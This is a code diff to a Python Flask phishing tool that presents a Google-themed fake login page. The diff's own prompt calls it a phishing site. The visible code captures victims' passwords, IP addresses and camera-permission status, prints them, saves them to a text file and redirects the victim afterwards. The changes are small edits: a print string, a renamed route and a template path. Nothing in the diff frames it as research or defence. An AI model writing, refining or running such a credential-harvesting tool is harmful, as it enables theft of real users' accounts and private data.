@@ -5,7 +5,7 @@ import time
 
 app = Flask(__name__, template_folder='Phishing/templates/Google')
 
-print('Let\'s set up your phishing site')
+print("Let's set up your phishing site")
 action_url = input('Paste the link here that will redirect the user after phishing (leave blank if you do not need a redirect): ')
 port = input("Enter the port of your site (Default: 8080): ")
 
@@ -39,10 +39,6 @@ def login():
     print('Password: ', password)
     print(f"User IP address: {user_ip}")
     print('Camera permission granted:', camera_permission)
-    
-    # Start a new thread to handle Tkinter window if needed
-    # if camera_permission:
-    #     Thread(target=start_camera_window).start()
 
     current_path = os.path.abspath(os.path.dirname(__file__))
     file_path = os.path.join(current_path, 'google_user_data.txt')
@@ -60,9 +56,9 @@ def login():
     else:
         return redirect(url_for('infa'))
 
-@app.route("/information")
+@app.route("/info")
 def infa():
-    return render_template('Blok.html')
+    return render_template('blok(Google)/Blok.html')
 
 def run_flask():
     app.run(host='0.0.0.0', port=port, debug=True, use_reloader=False)
@@ -77,4 +73,3 @@ if __name__ == '__main__':
             time.sleep(1)
     except KeyboardInterrupt:
         print("Stopping server...")
-        # Flask will automatically stop when the main thread is interrupted.
